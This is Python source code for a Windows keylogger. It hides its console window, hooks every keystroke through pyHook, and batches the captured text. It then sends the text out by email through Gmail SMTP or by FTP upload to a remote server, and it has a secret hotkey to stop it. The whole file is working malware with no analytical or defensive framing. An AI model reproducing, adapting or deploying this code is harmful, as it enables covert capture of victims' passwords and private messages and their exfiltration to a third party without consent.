import smtplib, time, os, threading, sys
import win32console, win32gui, win32event, win32api, winerror
from win32con import VK_CAPITAL
from ftplib import FTP
try:
    import pythoncom, pyHook
    from pyHook import GetKeyState, HookConstants
except ImportError:
    print("required pyhook and py2win32")
    exit()

strEmailAc = "email@gmail.com"
strEmailPass = "pass"

blnFTP = "False"  # if using ftp set this to true and configure the options below
strFtpServer = ""
intFtpPort = 21
strFtpUser = ""
strFtpPass = ""
strFtpRemotePath = "/"

intCharPerSend = 1000  # set num of chars before send log
blnBackRemove = "False"  # set this to True if you prefer the program removes the last key if the user types backspace

# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_xp4key')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit()

def hide(): # hide cmd window (optional if compiling as .exe)
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True
hide()

# open file in notepad if argument is given
if len(sys.argv) == 2:
    strtxtFileCommand = os.environ["windir"]+"\\notepad.exe "+sys.argv[1]
    os.system(strtxtFileCommand)

blnStop = "False"

def OnKeyboardEvent(event):
    global strLogs
    try: # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""

    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop):
        try:
            if blnStop == "True":
                strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
            else:
                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
                strMessage = strDateTime + "\n\n" + strLogs
                strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)

                SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                SmtpServer.ehlo()   # identifies you to the smtp server
                SmtpServer.login(strEmailAc, strEmailPass)
                SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
        except:
            os._exit(1)  # if for some reason, the email cannot send, exit program including threads.

    def SendMessagesFTP(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop):
        try:
            ftp = FTP(); ftp.connect(strFtpServer, 21)
            ftp.login(strFtpUser, strFtpPass); ftp.cwd(strFtpRemotePath)
            # connect to ftp server

            TMP = os.environ["TEMP"]
            objLogFile = open(TMP + "/keylog.txt", 'w')
            if blnStop == "True":
                objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")+"\n\n")
            else:
                objLogFile.write("\n\n""Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
            objLogFile.write(strLogs); objLogFile.close()
            # create log file

            arFileList  = ftp.nlst()
            if "keylog.txt" in arFileList:
                objLogFile = open(TMP + "/keylog.txt", 'rb'); ftp.storbinary("APPE keylog.txt", objLogFile)
            else:
                objLogFile = open(TMP + "/keylog.txt", 'rb'); ftp.storbinary("STOR keylog.txt", objLogFile)
            objLogFile.close()
            # send log file
        except:
            os._exit(1)

    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
        # CTRL-RIGHT_SHIFT-H to stop the program
        # create a new thread so that there is no delay while sending email
        if blnFTP == "True":
            SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, "True"))
            SendFTPThread.start()
        else:
            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True"))
            SendMailThread.start()
        exit()

    if event.Key == "Return":  # if the user types "enter" move to a new line
        strLogs = strLogs + "\n"
    elif event.Key == "Space":
        strLogs = strLogs + " "
    elif event.Key == "Back":
        if blnBackRemove == "True":
            if not strLogs == "":
                strLogs = strLogs[0:len(strLogs) - 1]
        else:
            strLogs = strLogs + " [Back] "
    elif event.Key == "Delete":
        strLogs = strLogs + " [Delete] "
    elif event.Key == "Tab":
        strLogs = strLogs + "\t"
    elif event.Key == "Oem_5":
        strLogs = strLogs + "\\"
    # check to see if key is shift + backslash
    elif event.Key == "Oem_5" and (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))):
        strLogs = strLogs + "|"
    elif event.Key == "Capital" or event.Key == "Rshift" or event.Key == "Lshift":
        pass
    elif len(event.Key) > 1:  # check to see if key is a special key
        strLogs = strLogs + " [" + event.Key + "] "
    else:
        # check to see if caps lock is on or the shift key is held down
        if win32api.GetKeyState(VK_CAPITAL) == 1 or (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))) and HookConstants.IDToName(event.KeyID).isalpha():
            strLogs = strLogs + event.Key
        else:
            # since event.Key outputs all keys as uppercase, lower normal ones
            strLogs = strLogs + ((event.Key).lower())

    if len(strLogs) >= intCharPerSend:  # send message
        if blnFTP == "True":
            SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath, blnStop))
            SendFTPThread.start()
        else:
            SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
            SendMailThread.start()
        strLogs = ""
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
